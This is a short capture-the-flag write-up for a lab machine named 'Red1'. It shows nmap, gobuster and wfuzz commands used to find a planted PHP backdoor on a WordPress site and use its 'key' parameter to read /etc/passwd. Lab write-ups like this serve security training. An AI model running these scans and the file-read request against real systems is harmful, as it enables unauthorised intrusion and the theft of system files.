# Red1
**IP: 10.0.4.7**
<br>
First of all I did an `nmap` scan and found that there are two open ports:<br>
> 80 _apache_ <br>
> 22 _ssh_

The site looks pretty simple. But I found some things in `robots.txt`<br>

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://redrocks.win/wp-sitemap.xml
```

I went to the sitemap and found that there is user named:
administrator

Checked it in the admin-login page and looks like it works.
<br>
Going to the site we know that there is a backdoor. The hacker said so.
<br>
Let's look for backdoors. We have a good wordlists with backdoor names in seclists.<br>
`gobuster dir -u http://10.0.4.7/ -w CommonBackdoors-PHP.fuzz.txt`<br>
Looks like we found one:<br>
```
/NetworkFileManagerPHP.php (Status: 500) [Size: 0]
```
There is nothing if we go there. Therefore, we can try to put there different requests like:<br>
`/NetworkFileManagerPHP.php?search=qwe`<br>
We can use `wfuzz` to do it.<br>
```
wfuzz -c -u "http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test" -w /usr/share/wfuzz/wordlist/general/big.txt --hh 00
```
We will find that the word `key` works.<br>
Try `http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd` and you will get a good result.
